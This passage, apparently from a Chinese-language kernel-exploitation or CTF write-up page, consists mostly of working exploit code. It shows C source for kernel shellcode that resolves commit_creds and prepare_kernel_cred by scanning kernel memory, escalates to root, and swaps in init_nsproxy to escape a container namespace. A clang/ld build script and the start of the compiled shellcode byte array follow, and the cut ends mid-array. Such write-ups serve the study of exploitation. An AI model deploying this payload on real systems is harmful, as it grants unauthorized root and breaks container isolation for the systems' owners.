  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>但上述逻辑如果要完全手动用汇编来写shellcode未免实在太困难，因此这里我直接用C来写shellcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">size_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;.intel_syntax noprefix; lea rdi, [rip+0x1000]&quot;</span>);</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;.intel_syntax noprefix; jmp main_start&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy from musl-libc</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_memcmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *vl, <span class="type">const</span> <span class="type">void</span> *vr, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *l = vl, *r = vr;</span><br><span class="line">    <span class="keyword">for</span> (; n &amp;&amp; *l == *r; n--, l++, r++)</span><br><span class="line">        ;</span><br><span class="line">    <span class="keyword">return</span> n ? *l - *r : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy from https://blog.csdn.net/lqy971966/article/details/106127286</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *<span class="title function_">my_memmem</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *haystack, <span class="type">size_t</span> hlen, <span class="type">const</span> <span class="type">char</span> *needle, <span class="type">size_t</span> nlen)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *cur;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *last;</span><br><span class="line"></span><br><span class="line">    last = haystack + hlen - nlen;</span><br><span class="line">    <span class="keyword">for</span> (cur = haystack; cur &lt;= last; ++cur) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!my_memcmp(cur, needle, nlen)) &#123;</span><br><span class="line">            <span class="keyword">return</span> cur;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">find_symtab</span><span class="params">(<span class="type">char</span> *start_pos, <span class="type">size_t</span> find_max, <span class="type">const</span> <span class="type">char</span> *func_name, <span class="type">size_t</span> func_length)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *strtab = my_memmem(start_pos, find_max, func_name, func_length);</span><br><span class="line">        <span class="keyword">if</span> (!strtab) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> *pos = (<span class="type">char</span> *)(((<span class="type">size_t</span>)start_pos) &amp; ~<span class="number">3</span>); pos &lt; (<span class="type">char</span> *)(((<span class="type">size_t</span>)start_pos) + find_max); pos += <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((pos + *(<span class="type">unsigned</span> <span class="type">int</span> *)pos) == strtab) &#123;</span><br><span class="line">                <span class="keyword">return</span> pos - <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        find_max -= (strtab + func_length) - start_pos;</span><br><span class="line">        start_pos = (strtab + func_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">get_ptr</span><span class="params">(<span class="type">char</span> *symtab)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (symtab) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">void</span> *)(symtab + *(<span class="type">int</span> *)(symtab));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pid_namespace_approx_size (0xa0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> task_struct_approx_size (0x3000)</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">find_init_task</span><span class="params">(<span class="type">char</span> *init_pid_ns)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> *pos = init_pid_ns; pos &lt; init_pid_ns + pid_namespace_approx_size; pos++) &#123;</span><br><span class="line">        <span class="type">size_t</span> may_ptr = *pos;</span><br><span class="line">        <span class="keyword">if</span> ((may_ptr &amp; <span class="number">0xffff000000000000</span>) != <span class="number">0xffff000000000000</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *may_task = (<span class="type">char</span> *)may_ptr;</span><br><span class="line">        <span class="comment">// check task</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> *pos2 = may_task; pos2 &lt; may_task + task_struct_approx_size; pos2++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*pos2 == may_task) &#123;</span><br><span class="line">                <span class="keyword">return</span> may_task;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> nsproxy_approx_size (0x60)</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">find_init_nsproxy</span><span class="params">(<span class="type">char</span> *init_pid_ns, <span class="type">char</span> *init_uts_ns, <span class="type">size_t</span> *nsproxy_offset)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *init_task = find_init_task(init_pid_ns);</span><br><span class="line">    <span class="keyword">if</span> (!init_task) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find init_nsproxy in init_task</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> *pos = init_task; pos &lt; init_task + task_struct_approx_size; pos++) &#123;</span><br><span class="line">        <span class="type">size_t</span> may_ptr = *pos;</span><br><span class="line">        <span class="keyword">if</span> ((may_ptr &amp; <span class="number">0xffff000000000000</span>) != <span class="number">0xffff000000000000</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (may_ptr == init_task) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// guess init_nsproxy</span></span><br><span class="line">        <span class="type">char</span> *may_nsproxy = may_ptr;</span><br><span class="line">        <span class="type">int</span> has_pid_ns = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> has_uts_ns = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> *pos2 = may_nsproxy; pos2 &lt; may_nsproxy + nsproxy_approx_size; pos2++) &#123;</span><br><span class="line">            <span class="type">size_t</span> may_ptr2 = *pos2;</span><br><span class="line">            <span class="keyword">if</span> (may_ptr2 == init_pid_ns) &#123;</span><br><span class="line">                has_pid_ns = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (may_ptr2 == init_uts_ns) &#123;</span><br><span class="line">                has_uts_ns = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (has_uts_ns &amp;&amp; has_pid_ns) &#123;</span><br><span class="line">                *nsproxy_offset = may_nsproxy - init_task;</span><br><span class="line">                <span class="keyword">return</span> may_nsproxy;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> find_max (0x2000000)</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">main_start</span><span class="params">(<span class="type">void</span> *start_pos)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// first, get root</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="type">void</span> *(*typ_prepare_kernel_cred)(<span class="type">size_t</span>);</span><br><span class="line">    <span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*typ_commit_creds)</span><span class="params">(<span class="type">void</span> *)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str_commit_creds[] = <span class="string">&quot;commit_creds&quot;</span>;</span><br><span class="line">    typ_commit_creds ptr_commit_creds = (typ_commit_creds)get_ptr(find_symtab(start_pos, find_max, str_commit_creds, <span class="keyword">sizeof</span>(str_commit_creds)));</span><br><span class="line">    <span class="keyword">if</span> (!ptr_commit_creds) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str_prepare_kernel_cred[] = <span class="string">&quot;prepare_kernel_cred&quot;</span>;</span><br><span class="line">    typ_prepare_kernel_cred ptr_prepare_kernel_cred = (typ_prepare_kernel_cred)get_ptr(find_symtab(start_pos, find_max, str_prepare_kernel_cred, <span class="keyword">sizeof</span>(str_prepare_kernel_cred)));</span><br><span class="line">    <span class="keyword">if</span> (!ptr_prepare_kernel_cred) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr_commit_creds(ptr_prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// then find init_nsproxy and pid1 task_struct</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="type">void</span> *(*typ_find_vpid)(<span class="type">size_t</span>);</span><br><span class="line">    <span class="keyword">typedef</span> <span class="type">void</span> *(*typ_pid_task)(<span class="type">void</span> *, <span class="type">size_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str_find_vpid[] = <span class="string">&quot;find_vpid&quot;</span>;</span><br><span class="line">    typ_find_vpid fptr_find_vpid = (typ_find_vpid)get_ptr(find_symtab(start_pos, find_max, str_find_vpid, <span class="keyword">sizeof</span>(str_find_vpid)));</span><br><span class="line">    <span class="keyword">if</span> (!fptr_find_vpid) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str_pid_task[] = <span class="string">&quot;pid_task&quot;</span>;</span><br><span class="line">    typ_pid_task fptr_pid_task = (typ_pid_task)get_ptr(find_symtab(start_pos, find_max, str_pid_task, <span class="keyword">sizeof</span>(str_pid_task)));</span><br><span class="line">    <span class="keyword">if</span> (!fptr_pid_task) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *task = fptr_pid_task(fptr_find_vpid(<span class="number">1</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str_init_pid_ns[] = <span class="string">&quot;init_pid_ns&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *ptr_init_pid_ns = get_ptr(find_symtab(start_pos, find_max, str_init_pid_ns, <span class="keyword">sizeof</span>(str_init_pid_ns)));</span><br><span class="line">    <span class="keyword">if</span> (!ptr_init_pid_ns) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str_init_uts_ns[] = <span class="string">&quot;init_uts_ns&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *ptr_init_uts_ns = get_ptr(find_symtab(start_pos, find_max, str_init_uts_ns, <span class="keyword">sizeof</span>(str_init_uts_ns)));</span><br><span class="line">    <span class="keyword">if</span> (!ptr_init_uts_ns) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> nsproxy_offset = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *init_ns_proxy = find_init_nsproxy(ptr_init_pid_ns, ptr_init_uts_ns, &amp;nsproxy_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!init_ns_proxy) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// escape namespace</span></span><br><span class="line">    *(<span class="type">size_t</span> *)(task + nsproxy_offset) = (<span class="type">size_t</span>)init_ns_proxy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了得到尽可能短的shellcode，我用了clang的-Oz来编译，并再加上了不少优化来缩小shellcode体积：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash -x</span></span><br><span class="line"></span><br><span class="line">clang main.c -masm=intel -S -o main.s \</span><br><span class="line">    -nostdlib -shared -Oz -fpic -fomit-frame-pointer \</span><br><span class="line">    -fno-exceptions -fno-asynchronous-unwind-tables \</span><br><span class="line">    -fno-unwind-tables -fcf-protection=none &amp;&amp; \</span><br><span class="line">sed -i <span class="string">&quot;s/.addrsig//g&quot;</span> main.s &amp;&amp; \</span><br><span class="line">sed -i <span class="string">&#x27;/.section/d&#x27;</span> main.s &amp;&amp; \</span><br><span class="line">sed -i <span class="string">&#x27;/.p2align/d&#x27;</span> main.s &amp;&amp; \</span><br><span class="line">as --64 -o main.o main.s &amp;&amp; \</span><br><span class="line">ld --oformat binary -o main.bin main.o --omagic &amp;&amp; \</span><br><span class="line">xxd -i main.bin</span><br></pre></td></tr></table></figure>

<p>最后得到如下的shellcode，还是有点长，一共有0x260多个字节。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x3d</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xeb</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x41</span>, <span class="number">0x57</span>,</span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0xfd</span>,</span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x0d</span>, <span class="number">0x5a</span>, <span class="number">0xe8</span>, <span class="number">0x85</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0x71</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0xef</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x14</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>,</span><br><span class="line">  <span class="number">0xe8</span>, <span class="number">0x67</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x2b</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xdd</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x08</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd1</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0xd3</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x0a</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>,</span><br><span class="line">  <span class="number">0xe8</span>, <span class="number">0x37</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0x23</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x6a</span>, <span class="number">0x09</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0xe8</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x0b</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xd9</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>,</span><br><span class="line">  <span class="number">0xd1</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0xff</span>, <span class="number">0xd3</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc6</span>, <span class="number">0x48</span>,</span><br><span class="line">  <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0x92</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x0c</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>,</span><br><span class="line">  <span class="number">0xe8</span>, <span class="number">0xe3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0xcf</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x63</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0x7d</span>,</span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x0c</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0xe8</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x84</span>, <span class="number">0xae</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xdf</span>, <span class="number">0x49</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line">  <span class="number">0x4c</span>, <span class="number">0x63</span>, <span class="number">0x10</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xc2</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0x8f</span>, <span class="number">0xa0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xfa</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xca</span>, <span class="number">0x0f</span>, <span class="number">0x83</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x02</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xc0</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc2</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0xeb</span>, <span class="number">0xe9</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0xb0</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">  <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0xf7</span>, <span class="number">0x73</span>, <span class="number">0xeb</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x7f</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x75</span>, <span class="number">0xf2</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x5d</span>, <span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x41</span>, <span class="number">0x5c</span>,</span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x49</span>, <span class="number">0x39</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x51</span>, <span class="number">0x4d</span>, <span class="number">0x8b</span>, <span class="number">0x0b</span>, <span class="number">0x4d</span>,</span><br><span class="line">  <span class="number">0x39</span>, <span class="number">0xc1</span>, <span class="number">0x72</span>, <span class="number">0x34</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span 